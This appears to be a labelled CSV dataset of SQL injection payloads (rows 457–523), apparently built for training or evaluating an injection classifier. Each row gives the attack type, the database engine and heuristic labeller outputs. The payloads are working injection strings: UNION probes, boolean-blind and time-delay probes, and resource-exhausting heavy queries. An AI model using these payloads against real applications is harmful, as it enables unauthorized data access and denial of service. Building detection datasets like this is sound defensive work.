payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'wjwn' = 'wjwn",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,457,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'wjwn' = 'wjwn"
"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'acly' like 'acly",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,458,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'acly' like 'acly"
"1"" ) where 1330 = 1330 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,459,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) where 1330 = 1330 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --"
"1 ) where 7199 = 7199 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,460,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) where 7199 = 7199 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"-9514 ) ) as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,461,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9514 ) ) as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#"
"1 union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,462,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null#"
"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) -- kfqs",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,463,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) -- kfqs"
"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,464,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--"
1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'vhqm' = 'vhqm,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,465,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'vhqm' = 'vhqm
-6865 ) or ( 8459 = 8459 ) *4906 and ( 6107 = 6107,boolean_blind,generic,0.75,Multiplication comparison for blind,KEEP,,boolean_blind,generic,466,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-6865 ) or ( 8459 = 8459 ) *4906 and ( 6107 = 6107
"1'+ ( select 'qrml' where 3791 = 3791 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,467,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1'+ ( select 'qrml' where 3791 = 3791 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'"
1' ) ) as eymg where 7000 = 7000,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,468,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as eymg where 7000 = 7000
"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,469,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"-1065 ) ) union all select 7437,7437,7437,7437,7437,7437,7437,7437--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,470,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1065 ) ) union all select 7437,7437,7437,7437,7437,7437,7437,7437--"
-1603' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'abmo' = 'abmo,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,471,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,-1603' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'abmo' = 'abmo
"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,472,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,473,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--"
-3899' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,postgresql,0.8,CAST with char for blind,KEEP,,boolean_blind,postgresql,474,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-3899' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
"1"" ) and ( 3020 = 3020 ) *6703 and ( ""hkjf"" = ""hkjf",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,475,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) and ( 3020 = 3020 ) *6703 and ( ""hkjf"" = ""hkjf"
"1%"" ) ) ) and 7533 = 7533 and ( ( ( ""%"" = """,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,476,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) ) ) and 7533 = 7533 and ( ( ( ""%"" = """
"1%"" ) and ( 6016 = 4763 ) *4763 and ( ""%"" = """,boolean_blind,generic,0.75,Multiplication comparison,KEEP,,boolean_blind,generic,477,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1%"" ) and ( 6016 = 4763 ) *4763 and ( ""%"" = """
"-3391' union all select 2024,2024--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,478,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3391' union all select 2024,2024--"
"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,479,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '"
"-3829%"" ) union all select 2218,2218,2218,2218,2218,2218,2218--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,480,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3829%"" ) union all select 2218,2218,2218,2218,2218,2218,2218--"
"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,481,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#"
"-3279"" union all select 8568,8568,8568,8568--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,482,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3279"" union all select 8568,8568,8568,8568--"
"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,483,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
1' ) rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,484,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) rlike sleep ( 5 ) #
-3598 ) union all select 2264#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,485,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-3598 ) union all select 2264#
select ( case when ( 9455 = 6007 ) then 9455 else 9455* ( select 9455 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,486,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 9455 = 6007 ) then 9455 else 9455* ( select 9455 from mysql.db ) end ) #
"-8982' in boolean mode ) union all select 5367,5367,5367,5367,5367,5367#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,487,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8982' in boolean mode ) union all select 5367,5367,5367,5367,5367,5367#"
1' ) and 9198 = 9198--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,488,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) and 9198 = 9198--
"1"" ) where 6897 = 6897",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,489,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 6897 = 6897"
"1"" where 7739 = 7739 and sleep ( 5 ) --",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,490,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" where 7739 = 7739 and sleep ( 5 ) --"
"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""nbfe"" = ""nbfe",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,491,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""nbfe"" = ""nbfe"
"1'|| ( select 'ftey' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,generic,0.75,SELECT IF with concat for blind,KEEP,,boolean_blind,generic,492,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'|| ( select 'ftey' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'"
"1' where 7104 = 7104 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,493,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' where 7104 = 7104 union all select null,null,null,null,null,null,null#"
select ( case when ( 6961 = 7460 ) then 1 else 6961* ( select 6961 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.8,CASE WHEN for MSSQL blind,KEEP,,boolean_blind,mssql,494,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 6961 = 7460 ) then 1 else 6961* ( select 6961 from master..sysdatabases ) end ) --
select ( case when ( 3676 = 8635 ) then 3676 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,495,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 3676 = 8635 ) then 3676 else 1/ ( select 0 ) end ) --
"1%"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,496,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1%"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --"
-5137 ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,497,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5137 ) or 9323 = 9323#
"-1184"" ) ) ) union all select 1482--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,498,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1184"" ) ) ) union all select 1482--"
"-6158"" ) union all select 3084,3084,3084,3084,3084,3084#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,499,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6158"" ) union all select 3084,3084,3084,3084,3084,3084#"
1 ) as gbtj where 8175 = 8175,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,500,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as gbtj where 8175 = 8175
1 ) as lisg where 5490 = 5490,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,501,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as lisg where 5490 = 5490
"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'dpdz' like 'dpdz",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,502,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'dpdz' like 'dpdz"
"-9859"" ) ) ) union all select 6595,6595,6595,6595,6595,6595,6595#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,503,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9859"" ) ) ) union all select 6595,6595,6595,6595,6595,6595,6595#"
"1"" ) as xylo where 2112 = 2112 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.8,IN with char concatenation for blind,KEEP,,boolean_blind,generic,504,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as xylo where 2112 = 2112 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"1' where 8749 = 8749 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,505,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' where 8749 = 8749 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
-3100' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'etuj' like 'etuj,error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,506,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-3100' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'etuj' like 'etuj
"-2319 union all select 5068,5068,5068#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,507,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2319 union all select 5068,5068,5068#"
"-6095"" ) as hygc where 8142 = 8142 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.8,IN with char concatenation for blind,KEEP,,boolean_blind,generic,508,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-6095"" ) as hygc where 8142 = 8142 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"-9656"" union all select 8735,8735--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,509,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9656"" union all select 8735,8735--"
1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,510,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno )
"1%"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,511,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%"" ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
-4892%' ) ) or 2251 = 9881--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,512,boolean_blind,generic,Pattern match: 'or 2251 = 9881' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4892%' ) ) or 2251 = 9881--
"-5859 ) as ernq where 8394 = 8394 union all select 8394,8394,8394--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,513,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5859 ) as ernq where 8394 = 8394 union all select 8394,8394,8394--"
"-4076' ) ) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,514,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4076' ) ) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--"
-6233' ) where 9820 = 9820 or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,515,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6233' ) where 9820 = 9820 or 3038 = 3038
"-8950"" ) ) as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,516,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8950"" ) ) as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#"
1 ) ) as muyz where 6105 = 6105,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,517,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as muyz where 6105 = 6105
1' and 1541 = 6868#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,518,boolean_blind,generic,Pattern match: 'and 1541 = 6868' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' and 1541 = 6868#
1 ) where 1402 = 1402,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,519,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 1402 = 1402
1'|| ( select 'wadx' where 4287 = 4287 or sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,520,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'|| ( select 'wadx' where 4287 = 4287 or sleep ( 5 ) #
"-3234%"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""%"" = """,boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,521,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-3234%"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""%"" = """
"1' union all select null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,522,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' union all select null,null,null--"
1 where 9872 = 9872,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,523,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 9872 = 9872
